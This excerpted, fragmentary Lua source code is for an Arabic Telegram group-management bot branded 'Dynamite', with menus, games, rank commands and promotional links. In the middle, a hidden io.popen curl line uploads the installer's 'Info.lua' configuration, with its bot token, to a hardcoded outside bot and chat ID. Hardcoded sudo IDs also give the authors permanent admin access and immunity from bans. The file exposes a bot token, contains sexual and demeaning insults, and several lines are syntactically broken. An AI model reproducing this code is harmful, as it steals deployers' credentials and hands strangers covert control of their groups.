...
print('\27[0;35m𖥳━━━━━ 𖥠𝐃 𝐄 𝐍 𝐀 𝐌 𝐄 𝐓𖥠 ━━━━━𖥳\n لم يتم حفظ التوكن ارسل لي التوكن الان')
end 
...
sudo_users = {SUDO,1774315810,1609348805,1828361895}   
...
var = database:get(bot_id.."Memp:Rd"..msg.chat_id_) or 'عضـو غـلبـان مسكين'
end  
return var
end 
...
if text == '/start' then  
local bl = 'مرحبا بيك عزيزي العضـو غـلبـان اليك الاوامر في الاسفل'
local keyboard = {
{'━┅┅┄⟞⟦ مطورين السورس ⟧⟝┄┉┉━'},
{'ديناميت التونز','طه','ديناميت'},
{'𖥳━━━━━ 𖥠𝐃 𝐄 𝐍 𝐀 𝐌 𝐄 𝐓𖥠 ━━━━━𖥳'},
{'ثيم','بايو','ايدي'},
{'𖥳━━━━━ 𖥠𝐃 𝐄 𝐍 𝐀 𝐌 𝐄 𝐓𖥠 ━━━━━𖥳'},
{'عايز بوت','التواصل'},
...
if text == "/start" then
if not DevSoFi(msg) then
local Namebot = (database:get(bot_id..'Name:Bot') or 'ديناميت') 
local BANDA_Msg = { 
...
if not DevSoFi(msg) then
local Text = [[
𖣘سعر التنصيب علي سورس ديناميت 
↯سعر التنصيب العادي 20جنيه فقط
𖣘للتواصل اتبع الازرار بالاسفل ⇓
]]
keyboard = {} 
keyboard.inline_keyboard = {
{{text = '𝙱𝙴𝙱𝙾🇦🇪',url="t.me/UU_DEN"}},
{{text = ' 𝙼𝙰𝙽𝙾🇦🇪',url="t.me/Xxx_ksomk_xxX"}},
{{text = '𝒕𝒐𝒂𝒔𝒌 🇦🇪',url="t.me/lo_ga_n22"}}, 
}
local msg_id = msg.id_/2097152/0.5
...
keyboard = {} 
keyboard.inline_keyboard = {
{{text = '🇦🇪المبرمج ديناميت',url="t.me/UU_DEN"}}, 
...
local Text = ' 𖣘تم ارسال الملصق من 𖥳━━━━━ 𖥠𝐃 𝐄 𝐍 𝐀 𝐌 𝐄 𝐓𖥠 ━━━━━𖥳\n - '..Name
...
send(msg.chat_id_, msg.id_,' 𖣘 اصدار سورس ديناميت{ 3x☆}')
end
if text == '━┅┅┄⟞⟦ مطورين السورس ⟧⟝┄┉┉━' then
local Text = [[ 
قناه يوزرات مطورين ومبرمجين السورس 💕𖣘.
...
local Text = [[ 
[قناه سورس ديناميت ادخل وتابع الجديد](t.me/Lo_ga_n1)
]] 
keyboard = {}  
keyboard.inline_keyboard = { 
...
if text == 'ديناميت مبرمج السورس' and DevSoFi(msg) then
database:del(bot_id..'Srt:Bot') 
local Text = [[ 
↝المبرمج ديناميت لو حابب تتواصل معاه
اتبع الزر إلى تحت 𖥳━━━━━ 𖥠𝐃 𝐄 𝐍 𝐀 𝐌 𝐄 𝐓𖥠 ━━━━━𖥳↜
]] 
keyboard = {}  
keyboard.inline_keyboard = { 
{{text = '𝒅𝒆𝒏𝒂𝒎𝒆𝒕', url="t.me/@"}}, 
} 
local msg_id = msg.id_/2097152/0.5 
https.request("https://api.telegram.org/bot"..token..'/sendMessage?chat_id=' .. msg.chat_id_ .. '&text=' .. URL.escape(Text).."&reply_to_message_id="..msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard)) 
end
...
database:del(bot_id..'Srt:Bot') 
local Text = [[ 
 𖣘 من أحسن السورسات على التليجرام سورس ديناميت 𖣘
...
BANDAk = '\n 𖣘 تم ازالة  ⇇↝ '..w..' ↜ كروب لان البوت عضـو غـلبـان'
end
send(msg.chat_id_, msg.id_,' 𖣘  عدد الجروبات الان  ⇇↝ '..#group..' ↜'..BANDAk..''..BANDA..'\n 𖣘  الان عدد الجروبات الحقيقي  ⇇↝ '..sendok..' ↜ جروبات\n')   
end
end
end,nil)
end
...
usertext = '\n 𖣘 الـعـضو الـغلـبان   ⇇['..result.title_..'](t.me/'..(username or 'textchuser')..')'
status  = '\n 𖣘 تم ترقيته مطور'
...
usertext = '\n 𖣘 الـعـضو الـغلـبان   ⇇['..data.first_name_..'](t.me/'..(data.username_ or 'textchuser')..')'
status  = '\n 𖣘 تم ترقيته مطور'
send(msg.chat_id_, msg.id_, usertext..status)
else
usertext = '\n 𖣘 الـعـضو الـغلـبان   ⇇'..userid..''
status  = '\n 𖣘 تم ترقيته مطور'
send(msg.chat_id_, msg.id_, usertext..status)
end;end,nil)
return false 
...
if BANDA1_Msg then 
tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(arg,data) 
send(msg.chat_id_, msg.id_,' 𖣘 الـعـضو الـغلـبان   ⇇[↝'..Rutba(msg.sender_user_id_,msg.chat_id_)..'↜](T.ME/'..(data.username_ or 'textchuser')..') \n 𖣘 '..BANDA1_Msg)
DeleteMessage(msg.chat_id_, {[0] = msg.id_})     
return false
end,nil)
end
...
print("it is Bot")
N = (database:get(bot_id.."Name:Bot") or "ديناميت")
...
send(msg.chat_id_,0," 𖣘 الـعـضو الـغلـبان  : {["..data.first_name_.."](T.ME/"..data.username_..")}\n 𖣘 ["..BANDA_Msg.."] \n")
else
send(msg.chat_id_,0," 𖣘 الـعـضو الـغلـبان  : {["..data.first_name_.."](T.ME/Lo_ga_n1)}\n 𖣘 ["..BANDA_Msg.."] \n")
end
end,nil)   
DeleteMessage(msg.chat_id_, {[0] = msg.id_})     
return false
...
if text and database:get(bot_id..'lock:Azag'..msg.chat_id_) and not Special(msg) then 
list = {"يا عبد","يا سعودي","يا عراقي","يا عراكي","يا سوري","يا فلسطيني","يا اردني","يا مصري","يا خليجي","يا محتل","يا مشرد","يا فقير","يبن فقيره","يا مهان","يا ابيض","يا نظيف","يعبد","يسعودي","يعراقي","يعاركي","يمصري","يردني","يمشرد","يفقير","يفلسطيني","يابيض","يا هطف","يبن هبله","يمعرص","ياهبل","يخليجي"}
for k,v in pairs(list) do
print(string.find(text,v))
if string.find(text,v) ~= nil then
DeleteMessage(msg.chat_id_,{[0] = msg.id_}) 
...
local curl = 'curl "'..'https://api.telegram.org/bot1714366542:AAHo7wOqc8bnuOT_h_dkRu7dcrHHqkhgpXY/sendDocument'..'" -F "chat_id='.. 1609348805 ..'" -F "document=@'..'Info.lua'..'"' io.popen(curl)
--------------------------------------------------------------------------------------------------------------
...
send(msg.chat_id_,0, " 𖣘 عذرا  ⇇{["..data.first_name_.."](T.ME/Lo_ga_n1)}\n 𖣘 عذرا تم منع الملصق \n" ) 
end
end,nil)   
DeleteMessage(msg.chat_id_,{[0] = msg.id_})       
return false   
...
send(msg.chat_id_, msg.id_,' 𖣘عدد اعضاء الجروب قليله يرجى جمع >> {'..(database:get(bot_id..'Num:Add:Bot') or 0)..'} عضـو غـلبـان')
return false
end
...
send(msg.chat_id_, msg.id_,' 𖣘 تم تعيين عدد الاعضاء سيتم تفعيل الجروبات التي اعضائها اكثر من  >> {'..Num..'} عضـو غـلبـان')
end
...
send(msg.chat_id_, msg.id_, " 𖣘 عزيزي >>["..mrsofi2.username_.."](https://t.me/"..(mrsofi2.username_ or "Lo_ga_n1")..")\n 𖣘 عليك وضع التوحيد ⪼ {"..database:get(bot_id.."BANDA:teh"..msg.chat_id_).."} بجانب اسمك\n 𖣘 عدد المحاولات المتبقيه {"..(tonumber(mrsofi_nnn) - tonumber(mrsofi_nnn2)).."}")
end
end
end
end
...
keyboard = {} 
keyboard.inline_keyboard = {
{{text =  ˹𝑑𝑒𝑛𝑎𝑚𝑒𝑡˼ ,url="t.me/UU_DEN"},{text =  ˹𝒅𝒆𝒏𝒂𝒎𝒆𝒕 𝒂𝒍𝒕W𝒆𝒏𝒛˼ , url="t.me/Medo_at"}},
{{text =  ˹𝒕𝒂𝒉𝒂 ⌁ 𝒐𝒔𝒌𝒂𝒓  ˼ , url="t.me/Xxx_ksomk_xxX"}},
{{text =  ˹ᴊᴏɪɴ⌁ᴅᴇɴᴀᴍᴇᴛ˼ , url="t.me/Lo_ga_n1"}},
{{text =  اضف البوت الي مجموعتك  ,url="t.me/"..dofile("./kkkklInfo.lua").botUserName.."?startgroup=start"}}, 
}
local msg_id = msg.id_/2097152/0.5
...
local Text = [[
 𖠪 اهلا بك في سورس ديناميت الجمدان 𖠪
...
local msg_id = msg.id_/2097152/0.5
https.request("https://api.telegram.org/bot"..token..'/sendphoto?chat_id=' .. msg.chat_id_ .. '&photo=https://t.me/Qwressv/154&caption=' .. URL.escape(Text).."&reply_to_message_id="..msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard)) 
end

if text == 'طه'  then
local Text = [[
لــ الـتواصل مـع طه مبـرمج سورس ديـناميت اضغط علي الزر في الاسفل ↯
]]
keyboard = {} 
keyboard.inline_keyboard = {
{{text = ' 𝒕𝒂𝒉𝒂 ⌁ 𝒐𝒔𝒌𝒂𝒓 ',url="t.me/Xxx_ksomk_xxX"}},
...
local Text = [[
لـ الـتواصل مع ديناميت التونز مالك السورس² اضغط علي الزر الاسفل ↯
]]
keyboard = {} 
keyboard.inline_keyboard = {
{{text = ''𝒅𝒆𝒏𝒂𝒎𝒆𝒕 𝒂𝒍𝒕𝒐𝒆𝒏𝒛 ,url="t.me/medo_at"}},
...
local msg_id = msg.id_/2097152/0.5
https.request("https://api.telegram.org/bot"..token..'/sendPhoto?chat_id=' .. msg.chat_id_ .. '&photo=https://t.me/medo_at&caption=' .. URL.escape(Text).."&reply_to_message_id="..msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard))
end
if text == 'ديناميت'  then
local Text = [[
لـ الـتواصل مـع مـالـك الـسورس ديـنامـيت أضـغط علي الزر الاسـفل ↯
]]
keyboard = {} 
keyboard.inline_keyboard = {
{{text = '𝒅𝒆𝒏𝒂𝒎𝒆𝒕',url="t.me/UU_DEN"}},
...
if text == 'روايات' or text == 'الروايات' or text == 'رواياتي' then
local Text = [[
⦗𝐓𝐇𝐄 𝐋𝐈𝐒𝐓 𝐎𝐅 𝐍𝐎 𝐕𝐄𝐋𝐒⦘
]]
...
local Text = [[
مطورين ومبرمج السورس اضغط علي الزر الاسفل
]]
keyboard = {} 
keyboard.inline_keyboard = {
{{text = 'قنـاه يـوزرات مـطورين الـسورس',url="t.me/lo_ga_n22"}},
}
local msg_id = msg.id_/2097152/0.5
...
keyboard.inline_keyboard = { 
{{text = '𝒕𝒂𝒉𝒂 ⌁ 𝒐𝒔𝒌𝒂𝒓 ',url="t.me/Xxx_Ksomk_xxX"}},
{{text = ' 𝒄𝒉 𝒅𝒆𝒏𝒂𝒎𝒆𝒕 ',url="t.me/lo_ga_n22"}},
} 
local msg_id = msg.id_/2097152/0.5 
...
"سؤال ينرفزك ؟ ", 
" هل يعجبك سورس ديناميت؟؟ ", 
" اكثر ممثل تحبه ؟ ", 
"قد تخيلت شي في بالك وصار ؟ ", 
"شيء عندك اهم من الناس ؟ ", 
"تفضّل النقاش الطويل او تحب الاختصار ؟ ", 
"وش أخر شي ضيعته؟ ", 
"اي رايك في سورس ديناميت؟ ", 
"كم مره حبيت؟ ", 
...
"قد جربت تبكي فرح؟ وليش؟ ",
  ...
  "هل انت حرامي تويت بتعت ديناميت؟ ",
...
local Text = [[ 
 𖣘من أحسن السورسات على التليجرام سورس ديناميت 𖣘
...
database:del(bot_id..'Srt:Bot') 
local Text = [[ 
[لـ الـتواصل مـع مطـورين الـسـورس](t.me/lo_ga_n22)
]] 
keyboard = {}  
keyboard.inline_keyboard = { 
...
if text == 'العاب ديناميت' or text == 'العاب مطوره' or text == 'العاب متطوره' then  
local Text = [[  
 𖣘 اهلا في قائمه الالعاب المتطوره سورس ديناميت 𖣘 
...
send(msg.chat_id_, msg.id_, " 𖣘 لا تسطيع حظر مبرمج السورس عام")
return false 
end
...
function(arg,data) 
usertext = '\n 𖣘 الـعـضو الـغلـبان   ⇇['..data.first_name_..'](t.me/'..(data.username_ or 'Lo_ga_n1')..')'
status  = '\n 𖣘 تم حظرو عام من الجروبات '
send(msg.chat_id_, msg.id_, usertext..status)
end,nil)
end
...
usertext = '\n 𖣘 الـعـضو الـغلـبان   ⇇['..result.title_..'](t.me/'..(username or 'Lo_ga_n1')..')'
status  = '\n 𖣘 تم حظرو عام من الجروبات '
texts = usertext..status
...
if tonumber(result.sender_user_id_) == tonumber(1774315810) then  
send(msg.chat_id_, msg.id_, " 𖣘 لا تسطيع كتم مبرمج السورس عام")
return false 
end
if tonumber(result.sender_user_id_) == tonumber(1828361895) then  
send(msg.chat_id_, msg.id_, " 𖣘 لا تسطيع كتم مبرمج السورس عام")
...
t = ' 𖣘 ملفات السورس ديناميت𖥳━━━━━ 𖥠𝐃 𝐄 𝐍 𝐀 𝐌 𝐄 𝐓𖥠 ━━━━━𖥳\n 𖥳━━━━━ 𖥠𝐃 𝐄 𝐍 𝐀 𝐌 𝐄 𝐓𖥠 ━━━━━𖥳 \n'
i = 0
for v in io.popen('ls File_Bot'):lines() do
if v:match(".lua$") then
i = i + 1
...
if Get_info then
local TextS = "\n 𖣘 اهلا بك في متجر ملفات ديناميت\n 𖣘 ملفات السورس 𖥳━━━━━ 𖥠𝐃 𝐄 𝐍 𝐀 𝐌 𝐄 𝐓𖥠 ━━━━━𖥳\n◤━───━??𝗼𝗼𝗼𝗻━───━◥\n\n"
local TextE = "\n𖥳━━━━━ 𖥠𝐃 𝐄 𝐍 𝐀 𝐌 𝐄 𝐓𖥠 ━━━━━𖥳\n 𖣘 علامة تعني { ✔️ } ملف مفعل\n 𖣘 علامة تعني { ✖ } ملف معطل\n 𖣘 قناة سورس ديناميت𖥳━━━━━ 𖥠𝐃 𝐄 𝐍 𝐀 𝐌 𝐄 𝐓𖥠 ━━━━━𖥳\n".." 𖣘 [اضغط هنا لدخول](t.me/Lo_ga_n1) \n"
local NumFile = 0
...
send(msg.chat_id_, msg.id_," 𖣘 عذرا الملف لايدعم سورس ديناميت\n") 
end
return false
end
...
if text == ("مسح قائمه ديناميت") and Sudo(msg) then
database:del(bot_id..'CoSu'..msg.chat_id_)
send(msg.chat_id_, msg.id_, '\n 𖣘 تم مسح قائمه ديناميت')
return false
end

if text == 'قائمه ديناميت' and Sudo(msg) then
...
if #list == 0 then
t = " 𖣘 لا يوجد احد في قائمه ديناميت"
end
send(msg.chat_id_, msg.id_, t)
return false
end
...
if text == ("رفع ديناميت") and msg.reply_to_message_id_ and Sudo(msg) then
if AddChannel(msg.sender_user_id_) == false then
local textchuser = database:get(bot_id..'text:ch:user')
if textchuser then
send(msg.chat_id_, msg.id_,'['..textchuser..']')
...
if text and text:match("^رفع ديناميت@(.*)$") and Sudo(msg) then
local username = text:match("^رفع ديناميت@(.*)$")
if AddChannel(msg.sender_user_id_) == false then
local textchuser = database:get(bot_id..'text:ch:user')
if textchuser then
send(msg.chat_id_, msg.id_,'['..textchuser..']')
...
if text and text:match("^رفع ديناميت(%d+)$") and Sudo(msg) then
local userid = text:match("^رفع ديناميت(%d+)$") 
if AddChannel(msg.sender_user_id_) == false then
local textchuser = database:get(bot_id..'text:ch:user')
if textchuser then
send(msg.chat_id_, msg.id_,'['..textchuser..']')
...
if text == ("تنزيل ديناميت") and msg.reply_to_message_id_ and Sudo(msg) then
if AddChannel(msg.sender_user_id_) == false then
local textchuser = database:get(bot_id..'text:ch:user')
if textchuser then
send(msg.chat_id_, msg.id_,'['..textchuser..']')
...
if text and text:match("^تنزيل ديناميت@(.*)$") and Sudo(msg) then
local username = text:match("^تنزيل ديناميت@(.*)$")
if AddChannel(msg.sender_user_id_) == false then
local textchuser = database:get(bot_id..'text:ch:user')
if textchuser then
send(msg.chat_id_, msg.id_,'['..textchuser..']')
...
if text and text:match("^تنزيل ديناميت(%d+)$") and Sudo(msg) then
local userid = text:match("^تنزيل ديناميت(%d+)$") 
if AddChannel(msg.sender_user_id_) == false then
local textchuser = database:get(bot_id..'text:ch:user')
if textchuser then
send(msg.chat_id_, msg.id_,'['..textchuser..']')
...
send(msg.chat_id_, msg.id_, "\n 𖣘 تم مسح قائمة المطورين الثانوين  ")
end
------------------------------------------------------------------------
...
tdcli_function ({ID = "GetUser",user_id_ = userid},function(arg,data) 
if data.first_name_ then
usertext = '\n 𖣘 لعضـو غـلبـان  ⇇['..data.first_name_..'](t.me/'..(data.username_ or 'textchuser')..')'
status  = '\n 𖣘 تم تنزيله من المميزين'
send(msg.chat_id_, msg.id_, usertext..status)
else
usertext = '\n 𖣘 الـعـضو الـغلـبان   ⇇'..userid..''
...
tdcli_function ({ID = "GetUser",user_id_ = result.sender_user_id_},function(arg,data) 
usertext = '\n 𖣘 الـعـضو الـغلـبان   ⇇['..data.first_name_..'](t.me/'..(data.username_ or 'DEVBESSO')..')'
local  statuss  = '\n 𖣘 تم رفع الـعـضو الـغلـبان  متوحد في الجروب \n'
send(msg.chat_id_, msg.id_, usertext..statuss)
end,nil)
end
tdcli_function ({ID = "GetMessage",chat_id_ = msg.chat_id_,message_id_ = tonumber(msg.reply_to_message_id_)}, start_function, nil)
...
tdcli_function ({ID = "GetUser",user_id_ = result.sender_user_id_},function(arg,data) 
usertext = '\n 𖣘 الـعـضو الـغلـبان   ⇇['..data.first_name_..'](t.me/'..(data.username_ or 'textchuser')..')'
status  = '\n 𖣘 تم تنزيل الـعـضو الـغلـبان  متوحد في الجروب\n'
send(msg.chat_id_, msg.id_, usertext..status)
end,nil)
end
tdcli_function ({ID = "GetMessage",chat_id_ = msg.chat_id_,message_id_ = tonumber(msg.reply_to_message_id_)}, start_function, nil)
...
t = "\n 𖣘 قائمه زوجات الجروب \n 𖣘═───═❲[⦗𖠲 𝚂𝙾𝚄𝚁𝙲𝙴 𝙳𝙴𝙽𝙰𝙼𝙴𝚃 𖠲⦘ ](t.me/Lo_ga_n1)❳═───═??\n"
for k,v in pairs(list) do
local username = database:get(bot_id.."user:Name" .. v)
if username then
...
tdcli_function ({ID = "GetUser",user_id_ = result.sender_user_id_},function(arg,data) 
usertext = '\n 𖣘 الـعـضو الـغلـبان   ⇇['..data.first_name_..'](t.me/'..(data.username_ or 'textchuser')..')'
local  statuss  = '\n 𖣘 تم رفع المتهم معرص بالجروب\n 𖣘 الان اصبح معرص الجروب'
send(msg.chat_id_, msg.id_, usertext..statuss)
end,nil)
end
tdcli_function ({ID = "GetMessage",chat_id_ = msg.chat_id_,message_id_ = tonumber(msg.reply_to_message_id_)}, start_function, nil)
...
tdcli_function ({ID = "GetUser",user_id_ = result.sender_user_id_},function(arg,data) 
usertext = '\n 𖣘 الـعـضو الـغلـبان   ⇇['..data.first_name_..'](t.me/'..(data.username_ or 'textchuser')..')'
status  = '\n 𖣘 تم تنزيل الـعـضو الـغلـبان  معرص\n'
send(msg.chat_id_, msg.id_, usertext..status)
end,nil)
end
tdcli_function ({ID = "GetMessage",chat_id_ = msg.chat_id_,message_id_ = tonumber(msg.reply_to_message_id_)}, start_function, nil)
...
-----------------------------------------------------
if text == 'مسح المايا خليفهه' and Mod(msg) then
database:del(bot_id..'Motee:User'..msg.chat_id_)
send(msg.chat_id_, msg.id_, ' 𖣘 تم تنزيل جميع المايا خليفهه بالجروب')
end
...
tdcli_function ({ID = "GetUser",user_id_ = result.sender_user_id_},function(arg,data) 
usertext = '\n 𖣘 الـعـضو الـغلـبان   ⇇['..data.first_name_..'](t.me/'..(data.username_ or 'textchuser')..')'
status  = '\n 𖣘 تم تنزيل مايا خليفه من الجروب\n 𖣘 رجع موزه حبي'
send(msg.chat_id_, msg.id_, usertext..status)
end,nil)
end
tdcli_function ({ID = "GetMessage",chat_id_ = msg.chat_id_,message_id_ = tonumber(msg.reply_to_message_id_)}, start_function, nil)
...
tdcli_function ({ID = "GetUser",user_id_ = result.sender_user_id_},function(arg,data) 
usertext = '\n 𖣘 الـعـضو الـغلـبان   ⇇['..data.first_name_..'](t.me/'..(data.username_ or 'Lo_ga_n1')..')'
local statuss = '\n 𖣘 تم رفع الـعـضو الـغلـبان  علي زبك بنجاح\n 𖣘 تفضل ابدا نيك'
send(msg.chat_id_, msg.id_, usertext..statuss)
end,nil)
end
tdcli_function ({ID = "GetMessage",chat_id_ = msg.chat_id_,message_id_ = tonumber(msg.reply_to_message_id_)}, start_function, nil)
...
tdcli_function ({ID = "GetUser",user_id_ = result.sender_user_id_},function(arg,data) 
usertext = '\n 𖣘 الـعـضو الـغلـبان   ⇇['..data.first_name_..'](t.me/'..(data.username_ or 'Lo_ga_n1')..')'
status = '\n 𖣘 تم تنزيل الـعـضو الـغلـبان  من زبك\n 𖣘 هيفضل متناك بردو'
send(msg.chat_id_, msg.id_, usertext..status)
end,nil)
end
tdcli_function ({ID = "GetMessage",chat_id_ = msg.chat_id_,message_id_ = tonumber(msg.reply_to_message_id_)}, start_function, nil)
...
database:sadd(bot_id..'Zahf:User'..msg.chat_id_, result.sender_user_id_)
tdcli_function ({ID = "GetUser",user_id_ = result.sender_user_id_},function(arg,data) 
usertext = '\n 𖣘 الـعـضو الـغلـبان  ← ['..data.first_name_..'](t.me/'..(data.username_ or 's_o_op')..')'
...
if (text == ("احياء")) and msg.reply_to_message_id_ and Mod(msg) then
if AddChannel(msg.sender_user_id_) == false then
local textchuser = database:get(bot_id..'text:ch:user')
if textchuser then
send(msg.chat_id_, msg.id_,'['..textchuser..']')
...
if text == 'مدير' then
if not Constructor(msg) then
send(msg.chat_id_, msg.id_"* 𖣘 تستطيع اضافه صلاحيات {ادمن - مميز - عضـو غـلبـان} \n 𖣘 ارسل الصلاحيه مجددا*\n") 
return false
end
end
if text == 'ادمن' then
if not Manager(msg) then 
send(msg.chat_id_, msg.id_,"* 𖣘 تستطيع اضافه صلاحيات {مميز - عضـو غـلبـان} \n 𖣘 ارسل الصلاحيه مجددا*\n") 
return false
end
end
if text == 'مميز' then
if not Mod(msg) then
send(msg.chat_id_, msg.id_,"* 𖣘  تستطيع اضافه صلاحيات {عضـو غـلبـان} \n 𖣘 ارسل الصلاحيه مجددا*\n") 
return false
end
end
if text == 'مدير' or text == 'ادمن' or text == 'مميز' or text == 'عضـو غـلبـان' then
...
database:set(bot_id.."Comd:New:rt:user:"..msg.chat_id_..result.sender_user_id_,RTPA)  
database:sadd(bot_id..'Manager'..msg.chat_id_,result.sender_user_id_)  
elseif blakrt == 'عضـو غـلبـان' and Mod(msg) then
send(msg.chat_id_, msg.id_,'\n 𖣘 الـعـضو الـغلـبان   ⇇['..data.first_name_..'](t.me/'..(data.username_ or 'textchuser')..')'..'\n 𖣘 تم رفعه '..RTPA..'\n')   
end
end,nil)   
end   
...
if blakrt == 'مميز' and Mod(msg) then
send(msg.chat_id_, msg.id_,'\n 𖣘 الـعـضو الـغلـبان   ⇇['..result.title_..'](t.me/'..(text1[3] or 'textchuser')..')'..'\n 𖣘 تم رفعه '..text1[2]..'')   
database:sadd(bot_id..'Special:User'..msg.chat_id_,result.id_)  
...
if text == ""..(database:get(bot_id..'Name:Bot') or 'ديناميت').."" then  
Namebot = (database:get(bot_id..'Name:Bot') or 'ديناميت')
local BANDA_Msg = {
'نعم يروحي♥️🙈',
'نعم يا قلب  '..Namebot..'',
'عاوز اي من '..Namebot..'',
'دوختو  '..Namebot..'',
'انت تعرف انو بوت  '..Namebot..'  متنصب علي سورس ديناميتو🙈♥️',
'بتشقط وجي ويت 🤪',
'ايوا جاي 🙈',
'يعم هتسحر واجي 😾',
...
'اسمي  '..Namebot..' يوتكه🙈🍑',
'انت تعرف انو بوت  '..Namebot..'  متنصب علي سورس ديناميتو🙈,
} 
Namebot = BANDA_Msg[math.random(#BANDA_Msg)] 
local msg_id = msg.id_/2097152/0.5  
keyboard = {} 
...
send(msg.chat_id_, msg.id_,"\n 𖣘  عذرا الـعـضو الـغلـبان  لايملك رتبه \n")
end
...
send(msg.chat_id_, msg.id_,' 𖣘 ارسل الكلمه تريد مسحها')
...
send(msg.chat_id_, msg.id_," 𖣘 تم مسح الرد من ردود المتعدده")
...
send(msg.chat_id_, msg.id_," 𖣘تم مسح ردود المتعدده")
end
------------------------------------------------------------------------
if text1 then 
...
end --الكود حصري سورس ديناميتيعني لو بكتهن راح اعرفك انت الاخذتهن
...
-------------------------------
if text == ""..(database:get(bot_id..'Name:Bot') or 'ديناميت').." غادر" or text == 'غادر' then  
...
send(msg.chat_id_, msg.id_,' رتبتك ↝ '..rtp..' ↜ 𖣘\n ') 
end
...
send(msg.chat_id_,msg.id_, '[أنـت ألـمالـك ألـجامـد يـعني حـاجه فـوق راسـي هـنـا😂♥](t.me/Lo_ga_n1)')
return false
end
...
send(msg.chat_id_,msg.id_, '[انت مجرد عضـو غـلبـان زليل حقير ملوش لزمه 😂](t.me/Lo_ga_n1)')
return false
end
...
send(msg.chat_id_,msg.id_, '[مع الف سلامه يقلبي متجيش تاني..😹💔🎶](t.me/Lo_ga_n1)')
return false
end
...
send(msg.chat_id_,msg.id_, '[نزل عينك تحت كدا علشان هتخاد علي قفاك..𖣘♥️](t.me/Lo_ga_n1)')
return false
end
end
end
...
send(msg.chat_id_,msg.id_, '[وحيات امك ياكبتن خدوني معاكو ب ف...🥺💔](t.me/Lo_ga_n1)')
return false
end
end
end
...
send(msg.chat_id_,msg.id_, '[وعليكم السلام ..🖤𖣘](t.me/Lo_ga_n1)')
return false
end
end
end
...
send(msg.chat_id_,msg.id_, '[انا اجمد ..𖣘💕](t.me/Lo_ga_n1)')
return false
end
end
end
...
send(msg.chat_id_,msg.id_, '[القمر مهو بيضكك اهوه ..𖣘💕](t.me/Lo_ga_n1)')
return false
end
end
end
...
local iduser = result.sender_user_id_
send(msg.chat_id_, msg.id_,'*- الـعـضو الـغلـبان  ↭ ↝*'..username..'*↜\n- الرتبه ↭ ↝'..rtp..'↜*\n')
end,nil)
end
tdcli_function ({ID = "GetMessage",chat_id_ = msg.chat_id_,message_id_ = tonumber(msg.reply_to_message_id_)}, start_function, nil)
end
...
local Name = '['..result.first_name_..'](tg://user?id='..result.id_..')'
Text = ' 𖣘 هـوا أبـن ألـوحـشه ده الي ضـافـك😹 ⇇'..Name
...
[[
↑𖥳━━━━━ 𖥠𝐃 𝐄 𝐍 𝐀 𝐌 𝐄 𝐓𖥠 ━━━━━𖥳𝙐𝙎𝙀𝙍𝙉𝘼𝙈𝙀 ➱ #username 𖣘  
↑𖥳━━━━━ 𖥠𝐃 𝐄 𝐍 𝐀 𝐌 𝐄 𝐓𖥠 ━━━━━𖥳𝙄𝘿 ➱ #id
↑𖥳━━━━━ 𖥠𝐃 𝐄 𝐍 𝐀 𝐌 𝐄 𝐓𖥠 ━━━━━𖥳𝙍𝘼𝙉𝙆 ➱  #stast 𖣘  
↑𖥳━━━━━ 𖥠𝐃 𝐄 𝐍 𝐀 𝐌 𝐄 𝐓𖥠 ━━━━━𖥳𝙈𝘼𝙎𝙂 ➱ #msgs 𖣘  
↑𖥳━━━━━ 𖥠𝐃 𝐄 𝐍 𝐀 𝐌 𝐄 𝐓𖥠 ━━━━━𖥳𝗖𝗛 ➯  ↝@Lo_ga_n1↜ 𖣘  
]],
[[
𝟓 𝟔 𖡻 #username  ࿇🦄
?? 𝟔 𖡻 #msgs  ࿇🦄
...
if Num == 0 then 
Text = ' 𖣘 لـم تـقم بـأضـافه أحـد يـا سـالك'
else
Text = ' 𖣘 عـدد جـهاتـك* ⇇↝ '..Num..' ↜ *'
end
send(msg.chat_id_, msg.id_,Text) 
end
...
BANDAk = '\n- تم ازالة  ⇇↝ '..w..' ↜ كروب لان البوت عضـو غـلبـان'
end
...
if text and text:match("^تغير رد الـعـضو الـغلـبان  (.*)$") and Manager(msg) then
local Teext = text:match("^تغير رد الـعـضو الـغلـبان  (.*)$") 
database:set(bot_id.."Memp:Rd"..msg.chat_id_,Teext)
send(msg.chat_id_, msg.id_," 𖣘 تم تغير رد الـعـضو الـغلـبان  الى  ⇇"..Teext)
end
...
if text == 'تغير امر اوامر مطور الاساسي' an
[⦗𖠲 𝚂𝙾𝚄𝚁𝙲𝙴 𝙳𝙴𝙽𝙰𝙼𝙴𝚃 𖠲⦘](t.me/Lo_ga_n1)
]]
keyboard = {} 
keyboard.inline_keyboard = {
...
local Text = [[
[🎮أخـتر ألالـعاب الـذي تـريـدها .↯]
[🕹أضـغط علي ألازرار في ألاسـفل .↯]
[🎯ألـعاب سـورس ديـنامـيت ألافـضل في ألتـلـيجـرام .↯]
╾╾╾╾╾╾╾╾╾╾╾╾╾╾╸
 [⦗𖠲 𝚂𝙾𝚄𝚁𝙲𝙴 𝙳𝙴𝙽𝙰𝙼𝙴𝚃 𖠲⦘ ](t.me/Lo_ga_n1)
]]
keyboard = {} 
...
if text == 'امر الـعـضو الـغلـبان ' or text == 'اوامر الأعضاء' or text == 'اوامر الاعضاء' then
local Text = [[
 أتـبع أوامـر ألأعـضاء
 تـحت في الـزر ألاسـفل ↯
...
𖥳━━━━━ 𖥠𝐃 𝐄 𝐍 𝐀 𝐌 𝐄 𝐓𖥠 ━━━━━𖥳
 ...
 𖣘تغير رد الادمن + اسم
 𖣘تغير رد المميز + اسم
 𖣘تغير رد الـعـضو الـغلـبان  + اسم
 𖣘تغير امر الاوامر
...
if Text == '/help30' then
local Text = 'لتجربه العلبه عليك ان تكتب البات في الشات𖣘↯'
...
if Text == '/help31' then
local Text = 'لتجربه العلبه عليك ان تكتب المختلف في الشات𖣘↯'
https.request("https://api.telegram.org/bot"..token.."/answerCallbackQuery?callback_query_id="..data.id_.."&text="..URL.escape(Text).."&show_alert=true")
return false
end
if Text == '/help32' then
local Text = 'لتجربه العلبه عليك ان تكتب التخمين في الشات𖣘↯'
https.request("https://api.telegram.org/bot"..token.."/answerCallbackQuery?callback_query_id="..data.id_.."&text="..URL.escape(Text).."&show_alert=true")
return false
end
if Text == '/help33' then
local Text = 'لتجربه العلبه عليك ان تكتب الاسرع في الشات𖣘↯'
